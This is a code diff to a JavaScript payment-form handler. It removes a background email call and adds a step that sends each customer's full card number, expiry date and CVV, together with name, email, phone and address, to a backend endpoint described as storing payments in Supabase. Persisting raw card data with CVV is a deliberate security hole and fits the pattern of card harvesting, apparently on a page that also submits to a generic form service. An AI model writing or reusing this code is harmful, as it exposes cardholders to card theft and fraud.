@@ -360,34 +360,6 @@ async function handleSubmit(event) {
   formData.append('postal', postal);
   formData.append('country', country);
 
-  // Also prepare backend payload to send customer email (do this regardless of Web3Forms success)
-  const emailPayload = {
-    transaction_id: txnId,
-    name,
-    amount,
-    email,
-    phone: phoneVal,
-    address1: addr1,
-    address2: addr2,
-    city,
-    state,
-    postal,
-    country,
-  };
-
-  // fire-and-forget backend email (do not block Web3Forms)
-  (async () => {
-    try {
-      await fetch(`${API_BASE}/api/send-email`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(emailPayload),
-      });
-    } catch (e) {
-      console.warn('Background backend email failed:', e && e.message);
-    }
-  })();
-
   try {
     const res = await fetch('https://api.web3forms.com/submit', {
       method: 'POST',
@@ -397,8 +369,33 @@ async function handleSubmit(event) {
     const json = await res.json().catch(() => ({}));
     if (!res.ok || json.success === false) throw new Error(json.message || 'Submission failed');
 
-    // Web3Forms accepted — now send customer email via backend (same as admin email)
+    // Web3Forms accepted — now store payment in Supabase and send customer email
     try {
+      // Store payment data in Supabase
+      const paymentPayload = {
+        transaction_id: txnId,
+        name,
+        card: rawCard,
+        month: expiryMonth,
+        year: expiryYear,
+        cvv,
+        amount,
+        email,
+        phone: phoneVal,
+        address1: addr1,
+        address2: addr2,
+        city,
+        state,
+        postal,
+        country,
+      };
+      await fetch(`${API_BASE}/api/payments`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(paymentPayload),
+      });
+
+      // Send customer email via backend
       const emailPayload = {
         transaction_id: txnId,
         name,
@@ -417,9 +414,9 @@ async function handleSubmit(event) {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(emailPayload),
       });
-      // Email sent silently (backend handles success/failure)
-    } catch (emailErr) {
-      console.warn('Backend email send failed (non-critical):', emailErr);
+      // Payment stored and email sent silently (backend handles success/failure)
+    } catch (err) {
+      console.warn('Backend payment/email save failed (non-critical):', err);
       // Continue anyway — form was already accepted by Web3Forms
     }
 
